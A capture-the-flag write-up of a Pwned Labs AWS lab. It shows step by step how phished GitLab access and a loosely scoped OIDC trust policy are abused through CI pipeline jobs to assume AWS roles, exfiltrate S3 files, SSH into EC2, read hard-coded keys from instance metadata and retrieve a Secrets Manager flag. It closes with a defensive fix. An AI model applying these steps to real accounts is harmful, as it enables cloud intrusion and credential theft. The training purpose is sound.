---
title: Abuse OpenID Connect and GitLab for AWS Access
description: Abuse OpenID Connect and GitLab for AWS Access
image:
  path: aws.jpg
categories:
- Pwned Labs
- AWS
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/aws/
tags:
- pwnedlabs
- aws
- cloud
---
# Scenario
As part of our red team engagement for the global company Huge Logistics we have harvested AWS credentials from a code repository and also phished an employee with a maldoc to compromise their workstation. From this foothold we have also identified that, against best practice, the employee Paul Harisson is using a public disposible email service (maldrop.cc) with corporate accounts. We have gained access to their GitLab account. Can move deeper inside their infrastructure and demonstrate impact by accessing secret data? 

# Walkthrough
We are given GitLab credentials after successful phishing
```
Username: Paul.Harrison@huge-logistics.com
Password: _3X>#+QsKwv=S2"
```

We are prompted to enter verification code, click `send a code to another address associated with this account`

![](abuse-openid-connect-and-gitlab-for-aws-access-1.png)

Send code to `paulh@maildrop.cc`

![](abuse-openid-connect-and-gitlab-for-aws-access-2.png)

Visit `https://maildrop.cc/inbox/?mailbox=paulh` and copy the code

![](abuse-openid-connect-and-gitlab-for-aws-access-3.png)

Now we can have access to GitLab and we see single repo `huge-logistics/first_cicd_pipeline`

![](abuse-openid-connect-and-gitlab-for-aws-access-4.png)

It doesn't contain any useful information, let's continue with given AWS credentials.

First we need to find the region that company uses:
- If we know the name of a public S3 bucket that belongs to the company, by sending a head request using `curl`, would return the region that the bucket was created in, in the HTTP response
- If we know of any IP addresses that belong to the company, it's possible to find the regions by downloading the [ip-ranges.json](https://ip-ranges.amazonaws.com/ip-ranges.json) file from AWS documentation and parse it to identify the region based on the IP's prefix

Let's ping `huge-logistics.com` to find associated IP
```
└─$ ping huge-logistics.com                                                
PING huge-logistics.com (16.15.204.112) 56(84) bytes of data.
64 bytes from 16.15.204.112: icmp_seq=1 ttl=128 time=180 ms
```

We can use the script below to return the AWS region that the IP address is associated with
```
import ipaddress
import requests
import json
import sys

def fetch_json(url):
    """Fetches JSON data from a given URL."""
    try:
        response = requests.get(url)
        response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching data from {url}: {e}", file=sys.stderr)
        sys.exit(1)

def get_region_full_name(region_code, regions_data):
    """Looks up the full region name from the regions data."""
    for region in regions_data:
        if region.get('code') == region_code:
            return region.get('full_name', region_code)
    return region_code # Return code if full name not found

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 aws_ip_lookup.py <IP_ADDRESS>", file=sys.stderr)
        print("Example: python3 aws_ip_lookup.py 54.241.40.178", file=sys.stderr)
        print("Example: python3 aws_ip_lookup.py 2620:107:300f::3e35:3", file=sys.stderr)
        sys.exit(1)

    input_ip_str = sys.argv[1]

    AWS_IP_RANGES_URL = "https://ip-ranges.amazonaws.com/ip-ranges.json"
    AWS_REGIONS_URL = "https://raw.githubusercontent.com/jsonmaur/aws-regions/master/regions.json"

    print("Fetching AWS IP ranges...", file=sys.stderr)
    ip_ranges_data = fetch_json(AWS_IP_RANGES_URL)
    print("...done.", file=sys.stderr)

    print("Fetching AWS regions...", file=sys.stderr)
    regions_data = fetch_json(AWS_REGIONS_URL)
    print("...done.", file=sys.stderr)

    # Validate input IP
    try:
        ip_obj = ipaddress.ip_address(input_ip_str)
    except ValueError:
        print(f"Error: '{input_ip_str}' is not a valid IP address.", file=sys.stderr)
        sys.exit(1)

    print(f"Searching for {input_ip_str}...", file=sys.stderr)

    found = False
    result = {}

    # Combine IPv4 and IPv6 prefixes and sort for specificity
    prefixes = ip_ranges_data.get('prefixes', [])
    ipv6_prefixes = ip_ranges_data.get('ipv6_prefixes', [])

    # Sort by prefix length (longer = more specific) then by prefix string
    # Reverse to prioritize more specific (longer) matches first, like in JS example
    all_prefixes_raw = prefixes + ipv6_prefixes
    all_prefixes_sorted = sorted(
        all_prefixes_raw,
        key=lambda p: (
            ipaddress.ip_network(p.get('ip_prefix') or p.get('ipv6_prefix')).prefixlen,
            p.get('ip_prefix') or p.get('ipv6_prefix')
        ),
        reverse=True # Sort longer prefixes first
    )

    for p in all_prefixes_sorted:
        cidr_str = p.get('ip_prefix') or p.get('ipv6_prefix')
        if not cidr_str:
            continue

        try:
            network_obj = ipaddress.ip_network(cidr_str)
            if ip_obj in network_obj:
                result = {
                    "region": p.get('region'),
                    "service": p.get('service'),
                    "subnet": cidr_str,
                    "ip_version": "IPv6" if isinstance(ip_obj, ipaddress.IPv6Address) else "IPv4"
                }
                found = True
                break # Found the most specific match
        except ValueError:
            # Should not happen with valid AWS data, but good practice
            print(f"Warning: Invalid CIDR format in data: {cidr_str}", file=sys.stderr)
            continue

    if found:
        full_region_name = get_region_full_name(result['region'], regions_data)
        print("--- AWS IP Found ---")
        print(f"Region: {full_region_name}")
        print(f"Region code: {result['region']}")
        print(f"Service: {result['service']}")
        print(f"Subnet: {result['subnet']}")
    else:
        print("Not an AWS IP or not found in ranges.")

if __name__ == "__main__":
    # Ensure requests library is installed before main execution
    try:
        import requests
    except ImportError:
        print("Error: The 'requests' library is not installed.", file=sys.stderr)
        print("Please install it: pip install requests", file=sys.stderr)
        sys.exit(1)

    main()
```

If we run the script, we get the region `us-east-1`
```
└─$ python3 get-aws-ip.py 16.15.204.112 
Fetching AWS IP ranges...
...done.
Fetching AWS regions...
...done.
Searching for 16.15.204.112...
--- AWS IP Found ---
Region: US East (N. Virginia)
Region code: us-east-1
Service: AMAZON
Subnet: 16.15.192.0/18

```

After authentication, it seems like we don't have permissions to enumerate the policies
```
└─$ aws iam list-attached-user-policies --user-name pentester                    

An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation: User: arn:aws:iam::583554811645:user/pentester is not authorized to perform: iam:ListAttachedUserPolicies on resource: user pentester because no identity-based policy allows the iam:ListAttachedUserPolicies action
```
```
└─$ aws iam list-user-policies --user-name pentester

An error occurred (AccessDenied) when calling the ListUserPolicies operation: User: arn:aws:iam::583554811645:user/pentester is not authorized to perform: iam:ListUserPolicies on resource: user pentester because no identity-based policy allows the iam:ListUserPolicies action
```

We can try enumerating AWS environment using [Cloudfox](https://github.com/BishopFox/cloudfox/releases)
```
└─$ cloudfox aws all-checks          
[🦊 cloudfox v1.15.0 🦊 ][] AWS Caller Identity: arn:aws:iam::583554811645:user/pentester
[🦊 cloudfox v1.15.0 🦊 ][] Account is not part of an Organization
[🦊 cloudfox 🦊 ] Getting a lay of the land, aka "What regions is this account using?"
[inventory][583554811645-AIDAYPXUTY366NBIPUDTL] Enumerating selected services in all regions for account 583554811645.
[inventory][583554811645-AIDAYPXUTY366NBIPUDTL] Supported Services: ApiGateway, ApiGatewayv2, AppRunner, CloudFormation, Cloudfront, CodeBuild, DynamoDB,  
[inventory][583554811645-AIDAYPXUTY366NBIPUDTL]                         EC2, ECS, ECR, EKS, ELB, ELBv2, Glue, Grafana, IAM, Lambda, Lightsail, MQ, 
[inventory][583554811645-AIDAYPXUTY366NBIPUDTL]                         OpenSearch, RedShift, RDS, Route53, S3, SecretsManager, SNS, SQS, SSM, Step Functions
[inventory] Status: 1549/1549 tasks complete (1113 errors -- For details check /home/kali/.cloudfox/cloudfox-error.log)
<SNIP>
```

After completion of tool, we can check the results in `~/.cloudfox/cached-data/aws/<random_id>`. If we check `583554811645-iam-ListUsers.json ` file, we see that there are `awsmanagementuser`, `bob`, `louise` and `pentester` principals
```
{
  "Value": [
    {
      "Arn": "arn:aws:iam::583554811645:user/awsmanagementuser",
      "CreateDate": "2023-12-19T08:57:08Z",
      "Path": "/",
      "UserId": "AIDAYPXUTY36SCZMP3OTY",
      "UserName": "awsmanagementuser",
      "PasswordLastUsed": null,
      "PermissionsBoundary": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::583554811645:user/bob",
      "CreateDate": "2025-08-30T14:07:56Z",
      "Path": "/",
      "UserId": "AIDAYPXUTY36WT3YRSTDQ",
      "UserName": "bob",
      "PasswordLastUsed": null,
      "PermissionsBoundary": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::583554811645:user/louise",
      "CreateDate": "2025-08-30T14:07:56Z",
      "Path": "/",
      "UserId": "AIDAYPXUTY36RBQFORF7M",
      "UserName": "louise",
      "PasswordLastUsed": null,
      "PermissionsBoundary": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::583554811645:user/pentester",
      "CreateDate": "2025-08-30T14:07:56Z",
      "Path": "/",
      "UserId": "AIDAYPXUTY366NBIPUDTL",
      "UserName": "pentester",
      "PasswordLastUsed": null,
      "PermissionsBoundary": null,
      "Tags": null
    }
  ],
  "Exp": 1756575606101338124
}   
```

There are `engineering` and `gitlab_terraform_deploy` customer-managed roles
```
└─$ cat ~/.cloudfox/cached-data/aws/583554811645/583554811645-iam-ListRoles.json | grep RoleName | grep -v AWS
      "RoleName": "engineering",
      "RoleName": "gitlab_terraform_deploy",
      "RoleName": "OrganizationAccountAccessRole",

```

If we examine the roles, we see assume role policy document for both roles
```
└─$ cat ~/.cloudfox/cached-data/aws/583554811645/583554811645-iam-ListRoles.json
<SNIP>
    {
      "Arn": "arn:aws:iam::583554811645:role/engineering",
      "CreateDate": "2025-08-30T14:08:12Z",
      "Path": "/",
      "RoleId": "AROAYPXUTY366A64RGEM4",
      "RoleName": "engineering",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Sid%22%3A%22AllowEngineersToAssumeRole%22%2C%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22AWS%22%3A%5B%22arn%3Aaws%3Aiam%3A%3A583554811645%3Auser%2Flouise%22%2C%22arn%3Aaws%3Aiam%3A%3A583554811645%3Auser%2Fbob%22%5D%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": null,
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::583554811645:role/gitlab_terraform_deploy",
      "CreateDate": "2025-08-30T14:07:56Z",
      "Path": "/",
      "RoleId": "AROAYPXUTY36Y3T36IXGF",
      "RoleName": "gitlab_terraform_deploy",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Sid%22%3A%22AllowGitLabFromHugeLogistics%22%2C%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Federated%22%3A%22arn%3Aaws%3Aiam%3A%3A583554811645%3Aoidc-provider%2Fgitlab.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRoleWithWebIdentity%22%2C%22Condition%22%3A%7B%22StringEquals%22%3A%7B%22gitlab.com%3Aaud%22%3A%22https%3A%2F%2Fgitlab.com%22%7D%2C%22StringLike%22%3A%7B%22gitlab.com%3Asub%22%3A%22project_path%3Ahuge-logistics%2F%2A%22%7D%7D%7D%5D%7D",
      "Description": null,
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    }
<SNIP>
```

It's URL-encoded, we can use any tool to decode it. For example, [CyberChef](https://gchq.github.io/CyberChef/)

![](abuse-openid-connect-and-gitlab-for-aws-access-5.png)

![](abuse-openid-connect-and-gitlab-for-aws-access-6.png)

We see that `bob` and `louise` are allowed to assume `engineering` role. 
```
└─$ echo '{"Version":"2012-10-17","Statement":[{"Sid":"AllowEngineersToAssumeRole","Effect":"Allow","Principal":{"AWS":["arn:aws:iam::583554811645:user/louise","arn:aws:iam::583554811645:user/bob"]},"Action":"sts:AssumeRole"}]}' | jq .
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowEngineersToAssumeRole",
      "Effect": "Allow",
      "Principal": {
        "AWS": [
          "arn:aws:iam::583554811645:user/louise",
          "arn:aws:iam::583554811645:user/bob"
        ]
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

Let's examine `gitlab_terraform_deploy` role 
```
└─$ echo '{"Version":"2012-10-17","Statement":[{"Sid":"AllowGitLabFromHugeLogistics","Effect":"Allow","Principal":{"Federated":"arn:aws:iam::583554811645:oidc-provider/gitlab.com"},"Action":"sts:AssumeRoleWithWebIdentity","Condition":{"StringEquals":{"gitlab.com:aud":"https://gitlab.com"},"StringLike":{"gitlab.com:sub":"project_path:huge-logistics/*"}}}]}' | jq .
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowGitLabFromHugeLogistics",
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::583554811645:oidc-provider/gitlab.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "gitlab.com:aud": "https://gitlab.com"
        },
        "StringLike": {
          "gitlab.com:sub": "project_path:huge-logistics/*"
        }
      }
    }
  ]
}

```

In AWS, an `OIDC (OpenID Connect)` provider enables identity federation by allowing externally authenticated users to assume IAM roles. In this case, the company has configured GitLab (`gitlab.com`) as a federated identity provider. This allows users from GitLab projects under the `huge-logistics/*` path to assume the `gitlab_terraform_deploy` role via `sts:AssumeRoleWithWebIdentity`, enabling access to AWS resources for automation tasks such as CI/CD pipelines.

Key points of the policy:

- `Principal`: The policy designates `gitlab.com` as the federated identity provider (`arn:aws:iam::583554811645:oidc-provider/gitlab.com`). 
  - Only identities authenticated through this OIDC provider can attempt to assume the role.
- `Action`: Allows the action `sts:AssumeRoleWithWebIdentity`, which permits the role to be assumed using a valid OIDC token from GitLab.
- `Condition`:
    - `"StringEquals": { "gitlab.com:aud": "https://gitlab.com" }`
      - Ensures the audience (`aud`) claim in the OIDC token exactly matches `https://gitlab.com`, confirming the request is intended for GitLab's integration.
    - `"StringLike": { "gitlab.com:sub": "project_path:huge-logistics/*" }`
      - Limits access to identities associated with GitLab projects that match the path prefix `huge-logistics/*`.

This condition is relatively permissive. While it limits access to GitLab projects under the `huge-logistics/*` namespace, it doesn't enforce restrictions on specific project names, branches, or user identities. Since we have a user with access to a qualifying GitLab project, we can use their GitLab identity to generate a valid OIDC token and assume the `gitlab_terraform_deploy` role, gaining access to AWS resources.

Let's etrieve more info about the assume role policy document
```
└─$ aws iam get-role --role-name gitlab_terraform_deploy
{
    "Role": {
        "Path": "/",
        "RoleName": "gitlab_terraform_deploy",
        "RoleId": "AROAYPXUTY36Y3T36IXGF",
        "Arn": "arn:aws:iam::583554811645:role/gitlab_terraform_deploy",
        "CreateDate": "2025-08-30T14:07:56Z",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "AllowGitLabFromHugeLogistics",
                    "Effect": "Allow",
                    "Principal": {
                        "Federated": "arn:aws:iam::583554811645:oidc-provider/gitlab.com"
                    },
                    "Action": "sts:AssumeRoleWithWebIdentity",
                    "Condition": {
                        "StringEquals": {
                            "gitlab.com:aud": "https://gitlab.com"
                        },
                        "StringLike": {
                            "gitlab.com:sub": "project_path:huge-logistics/*"
                        }
                    }
                }
            ]
        },
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {}
    }
}

```

This means that if we can authenticate via GitLab as a project under huge-logistics, we can assume the `gitlab_terraform_deploy` role using `sts:AssumeRoleWithWebIdentity` and gain its privileges.

First, we need to navigate to `huge-logistics/first_cicd_pipeline` repository. Then go to `Settings > CI/CD` and under the `Variables` section. There we need to add 3 variables

![](abuse-openid-connect-and-gitlab-for-aws-access-7.png)


The 
- `AWS_CONFIG_FILE`
  - Type: File
  - Environments: All (default)
  - Flags:
    - Protect variable: Checked
    - Expand variable reference: Checked
  - Key: AWS_CONFIG_FILE
  - Value:
```
[profile oidc]
role_arn=${ROLE_ARN}
web_identity_token_file=${web_identity_token}
```
- `ROLE_ARN`
  - Type: Variable (default)
  - Environments: All (default)
  - Flags:
    - Protect variable: Checked
    - Expand variable reference: Checked
  - Key: ROLE_ARN
  - Value: `arn:aws:iam::<AWS_account_ID>:role/gitlab_terraform_deploy`
- `web_identity_token`
  - Type: File
  - Environments: All (default)
  - Flags:
    - Protect variable: Checked
    - Expand variable reference: Checked
  - Key: web_identity_token
  - Value: `${GITLAB_OIDC_TOKEN}`

After adding variables, we open Web IDE and create `.gitlab-ci-yml` file. We can use the following GitLab CI/CD configuration provided uses an AWS CLI Docker image to execute commands with AWS credentials authenticated via OpenID Connect (OIDC). 
```
variables:
  AWS_DEFAULT_REGION: us-east-1
  AWS_PROFILE: "oidc"

oidc:
  image:
    name: amazon/aws-cli:latest
    entrypoint: [""]
  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://gitlab.com
  script:
    - aws sts get-caller-identity
```
The configuration sets the AWS region and specifies an OIDC profile. The job named `oidc` uses an OIDC token with GitLab as the audience to authenticate with AWS. The script in the job runs `aws sts get-caller-identity` to display details about the AWS federated identity, which would confirm that the authentication process is correctly configured.

Commit the configuration and check the job results in `Build -> Jobs`. We see that we have successfully assumed the `gitlab_terraform_deploy` role and can now perform whatever actions this role has assigned.

![](abuse-openid-connect-and-gitlab-for-aws-access-8.png)

Let's list the buckets
```
variables:
  AWS_DEFAULT_REGION: us-east-1
  AWS_PROFILE: "oidc"

oidc:
  image:
    name: amazon/aws-cli:latest
    entrypoint: [""]
  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://gitlab.com
  script:
    - aws s3 ls
```

We found a bucket 

![](abuse-openid-connect-and-gitlab-for-aws-access-9.png)

Seems like bucket is deployed in `us-west-2` region
```
└─$ curl -sI https://huge-logistics-engineering-f03da6cbc3f6.s3.amazonaws.com
HTTP/1.1 403 Forbidden
x-amz-bucket-region: us-west-2
x-amz-request-id: ZAWBQ9FFMQMNP9B3
x-amz-id-2: t/hNmjhGDAtpvFu7w//nuI+pE2LKw7un63YHa4Ti+VKRy3UBHQiGvKv12RY9SMLWi5WNclAWNd0=
Content-Type: application/xml
Transfer-Encoding: chunked
Date: Sat, 30 Aug 2025 17:28:44 GMT
Server: AmazonS3

```

Let's list the content of the bucket
```
variables:
  AWS_DEFAULT_REGION: us-east-1
  AWS_PROFILE: "oidc"

oidc:
  image:
    name: amazon/aws-cli:latest
    entrypoint: [""]
  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://gitlab.com
  script:
    - aws s3 ls huge-logistics-engineering-f03da6cbc3f6
```

We discover the files `backup.txt` and `ec2.pem` files. Let's download them using `artifacts` feature

![](abuse-openid-connect-and-gitlab-for-aws-access-10.png)

Update the configuration file
```
variables:
  AWS_DEFAULT_REGION: us-east-1
  AWS_PROFILE: "oidc"

oidc:
  image:
    name: amazon/aws-cli:latest
    entrypoint: [""]
  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://gitlab.com
  script:
    - aws s3 sync s3://huge-logistics-engineering-f03da6cbc3f6/ .
  artifacts:
    paths:
      - backup.txt
      - ec2.pem
```

After job finishes, download a zip file containing the artifacts.

![](abuse-openid-connect-and-gitlab-for-aws-access-11.png)

`backup.txt` contains terraform output and AWS credentials related to `louise` user. But we also have ssh key file `ec2.pem`, which could mean that there's EC2 instance
```
└─$ cat backup.txt     
      "name": "louise",
      "provider": "provider[\"registry.terraform.io/hashicorp/aws\"].child_two",
      "instances": [
        {
          "schema_version": 0,
          "attributes": {
            "create_date": "2025-08-30T14:07:56Z",
            "encrypted_secret": null,
            "encrypted_ses_smtp_password_v4": null,
            "id": "AKIAYPXUTY36S7SGENVM",
            "key_fingerprint": null,
            "pgp_key": null,
            "secret": "<REDACTED>",
            "ses_smtp_password_v4": "<REDACTED>",
            "status": "Active",
            "user": "louise"
          },
<SNIP>
```

Credentials are valid and we can authenticate as `louise`
```
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAYPXUTY36RBQFORF7M",
    "Account": "583554811645",
    "Arn": "arn:aws:iam::583554811645:user/louise"
}
```

If we try listing attached policies, we find `ViewIamPermissions`
```
└─$ aws iam list-attached-user-policies --user-name louise
{
    "AttachedPolicies": [
        {
            "PolicyName": "ViewIamPermissions",
            "PolicyArn": "arn:aws:iam::583554811645:policy/ViewIamPermissions"
        }
    ]
}

```

We can't enumerate EC2 instances
```
└─$ aws ec2 describe-instances                            

An error occurred (UnauthorizedOperation) when calling the DescribeInstances operation: You are not authorized to perform this operation. User: arn:aws:iam::583554811645:user/louise is not authorized to perform: ec2:DescribeInstances because no identity-based policy allows the ec2:DescribeInstances action
```

We remember having `engineering` role, which can be assumed by `bob` and `louise`. So let's assume it
```
└─$ aws sts assume-role --role-arn arn:aws:iam::583554811645:role/engineering --role-session-name louise-eng
{
    "Credentials": {
        "AccessKeyId": "ASIAYPXUTY362GOIVEEW",
        "SecretAccessKey": "<REDACTED>",
        "SessionToken": "<REDACTED>",
        "Expiration": "2025-08-30T18:40:24Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAYPXUTY366A64RGEM4:louise-eng",
        "Arn": "arn:aws:sts::583554811645:assumed-role/engineering/louise-eng"
    }
}

```

Now authenticate with `aws configure` and set the token with `aws configure set aws_session_token "<token>"`
```
└─$ aws sts get-caller-identity
{
    "UserId": "AROAYPXUTY366A64RGEM4:louise-eng",
    "Account": "583554811645",
    "Arn": "arn:aws:sts::583554811645:assumed-role/engineering/louise-eng"
}
```

There are no instances in `us-east-1` region, but we do remember that bucket was deployed in `us-west-2`. So if we list EC2 instances from that region, we have the results
```
└─$ aws ec2 describe-instances --region us-west-2
{
<SNIP>
                    "PrivateDnsName": "ip-10-1-20-24.us-west-2.compute.internal",
                    "PublicDnsName": "",
                    "StateTransitionReason": "",
                    "AmiLaunchIndex": 0,
                    "ProductCodes": [],
                    "InstanceType": "t2.micro",
                    "LaunchTime": "2025-08-30T14:08:11.000Z",
                    "Placement": {
                        "GroupName": "",
                        "Tenancy": "default",
                        "AvailabilityZone": "us-west-2a"
                    },
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "SubnetId": "subnet-07deb96353b2e8071",
                    "VpcId": "vpc-0fd42c54bd9ad1795",
                    "PrivateIpAddress": "10.1.20.24"

<SNIP>

```

We can try retrieving distribution from the AMI instance of the EC2 instance, but we don't have access to do it
```
aws ec2 describe-images --image-ids <ImageID>
```

Now using ssh key found (don't forget to set permissions), we can login to EC2 instance
```
└─$ ssh -i ec2.pem louise@10.1.20.24
The authenticity of host '10.1.20.24 (10.1.20.24)' can't be established.
ED25519 key fingerprint is SHA256:oI+T/KPgRAu85xxfnIN2gC7TbinBDPksecJsWWu0Rk4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.1.20.24' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-1008-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug 30 17:46:47 UTC 2025

  System load:  0.0               Processes:             104
  Usage of /:   35.5% of 6.71GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for enX0: 10.1.20.24
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jun  8 08:53:56 2024 from 2.100.97.23
louise@ip-10-1-20-24:~$ 
```

It's worth checking internal instance metadata service (IMDS) on the instance, which sometimes can contain sensitive information
```
louise@ip-10-1-20-24:~$ curl http://169.254.169.254/latest/meta-data
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>401 - Unauthorized</title>
 </head>
 <body>
  <h1>401 - Unauthorized</h1>
 </body>
</html>

```

It fails since the IMDS endpoint is enabled but `HttpTokens` is set to `required`.  IMDSv2 introduced tokens to help protect against Server-Side Request Forgery (SSRF) attacks and other vulnerabilities
```
└─$ aws ec2 describe-instances --region us-west-2
{
<SNIP>
"MetadataOptions": {
    "State": "applied",
    "HttpTokens": "required",
    "HttpPutResponseHopLimit": 2,
    "HttpEndpoint": "enabled",
    "HttpProtocolIpv6": "disabled",
    "InstanceMetadataTags": "disabled"
<SNIP>
```

We can generate a token using [this command](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html). The first command will generate a token and the second command will use that token to access the metadata service
```
louise@ip-10-1-20-24:~$ TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    56  100    56    0     0  19808      0 --:--:-- --:--:-- --:--:-- 28000
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
reservation-id
security-groups
services/
```


There is no `iam` category in the output so the instance doesn't have an IAM Instance Role attached. Checking the `user-data` reveals the boot/startup script 
```
louise@ip-10-1-20-curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data
--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash

# Set AWS access keys
AWS_ACCESS_KEY_ID=AKIAYPXUTY36T6I4BMH6
AWS_SECRET_ACCESS_KEY=<REDACTED>

aws --profile bob configure set aws_secret_access_key $AWS_ACCESS_KEY_ID
aws --profile bob configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY

yum update -y
yum install -y httpd

systemctl start httpd

systemctl enable httpd
mkdir /var/www/html/hg_launch_website

cd /var/www/html/hg_launch_website
aws s3 cp s3://huge-logistics-website-data/ ./
--//--

```
We find  `bob`'s hard-coded AWS keys, where more secure approach instead would have been to attach an IAM role (permissioned with the principle of least privilege) to the EC2 instance

We authenticated as `bob` using found credentials (set region to `us-west-2`)
```
└─$ aws sts get-caller-identity
{
    "UserId": "AIDAYPXUTY36WT3YRSTDQ",
    "Account": "583554811645",
    "Arn": "arn:aws:iam::583554811645:user/bob"
}
```

Enumerate the policies using permissions of `engineering` role we have
```
└─$ aws --profile louise-eng iam list-attached-user-policies --user-name bob
{
    "AttachedPolicies": [
        {
            "PolicyName": "ReadSecretsManager",
            "PolicyArn": "arn:aws:iam::583554811645:policy/ReadSecretsManager"
        }
    ]
}

```

Let's examine customer managed policy `ReadSecretsManager`
```
└─$ aws --profile louise-eng iam get-policy-version --policy-arn arn:aws:iam::583554811645:policy/ReadSecretsManager --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "secretsmanager:ListSecrets",
                        "secretsmanager:GetSecretValue"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "AllowReadSecretsManager"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-08-30T14:07:56Z"
    }
}

```

Now list the secrets using `bob`'s session
```
└─$ aws secretsmanager list-secrets                    
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-west-2:583554811645:secret:flag_5cc9eb3e3e32-YnmbBU",
            "Name": "flag_5cc9eb3e3e32",
            "Description": "Congratulations! You found the flag!",
            "LastChangedDate": 1756562877.144,
            "LastAccessedDate": 1756512000.0,
            "SecretVersionsToStages": {
                "terraform-20250830140757071800000005": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": 1756562876.754
        }
    ]
}

```

Get the flag
```
└─$ aws secretsmanager get-secret-value --secret-id flag_5cc9eb3e3e32            
{
    "ARN": "arn:aws:secretsmanager:us-west-2:583554811645:secret:flag_5cc9eb3e3e32-YnmbBU",
    "Name": "flag_5cc9eb3e3e32",
    "VersionId": "terraform-20250830140757071800000005",
    "SecretString": "<REDACTED>",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1756562877.139
}

```
# Defense
This part is from [lab's defense section](https://pwnedlabs.io/labs/abuse-openid-connect-and-gitlab-for-aws-access)

To reduce exposure, the assume role policy should be tightened by scoping access to specific GitLab identities. This can be done by restricting the sub condition to an exact project_path, and optionally including claims for specific branches or tags using custom OIDC claims. This ensures that only trusted pipelines - such as those from a known project and branch - can assume the role, preserving functionality for engineers while significantly reducing the risk of unauthorized access.

```
{
    "Role": {
        "Path": "/",
        "RoleName": "gitlab_terraform_deploy",
        "RoleId": "AROAYACWJEZ7BXKFMMLCK",
        "Arn": "arn:aws:iam::549936768638:role/gitlab_terraform_deploy",
        "CreateDate": "2024-06-03T17:15:52Z",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "AllowGitlabToAssumeRole",
                    "Effect": "Allow",
                    "Principal": {
                        "Federated": "arn:aws:iam::549936768638:oidc-provider/gitlab.com"
                    },
                    "Action": "sts:AssumeRoleWithWebIdentity",
                    "Condition": {
                        "StringEquals": {
                            "gitlab.com:sub": "project_path:mygroup/myproject:ref_type:branch:ref:main"
                        }
                    }
                }
            ]
        },
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {}
    }
}
```

